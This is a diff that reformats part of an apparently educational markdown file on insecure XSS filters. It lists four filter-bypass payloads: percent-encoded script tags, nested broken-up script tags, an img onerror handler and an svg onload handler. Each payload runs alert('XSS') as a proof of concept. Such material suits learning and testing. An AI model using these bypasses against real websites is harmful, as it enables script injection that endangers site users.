@@ -63,15 +63,15 @@ An insecure XSS filter occurs when an application fails to properly validate use
   - It only removes known keywords, leaving edge cases and obfuscated payloads unfiltered.
   - Blacklist filtering can be bypassed by encoding, escaping, or obfuscating payloads.
 3. Testing bypasses in the application with XSS payloads
-    1. HTML Entity Encoding Bypass:
-       `<scr%69pt>alert('XSS')</scr%69pt>`
-       - The filter might not decode the `%69`, allowing the script to bypass the filter
-2. Broken-Up Script Tags:
-       `<scr<script>ipt>alert('XSS')</scr<script>ipt>`
-       - By splitting up the `<script>` tag, the filter might not catch the malicious code
-3. Onerror Event in an Image:
-       `<img src=x onerror=alert('XSS')>`
-       - Using event handlers like onerror, you can inject code via HTML elements
-4. JavaScript Obfuscation:
-       `<svg/onload=alert('XSS')>`
-       - SVG tags are often overlooked by filters, and the event handler can still execute the script
+- HTML Entity Encoding Bypass: <br/>
+   `<scr%69pt>alert('XSS')</scr%69pt>`
+   - The filter might not decode the `%69`, allowing the script to bypass the filter
+- Broken-Up Script Tags: <br/>
+   `<scr<script>ipt>alert('XSS')</scr<script>ipt>`
+   - By splitting up the `<script>` tag, the filter might not catch the malicious code
+- Onerror Event in an Image: <br/>
+   `<img src=x onerror=alert('XSS')>`
+   - Using event handlers like onerror, you can inject code via HTML elements
+- JavaScript Obfuscation: <br/>
+   `<svg/onload=alert('XSS')>`
+   - SVG tags are often overlooked by filters, and the event handler can still execute the script
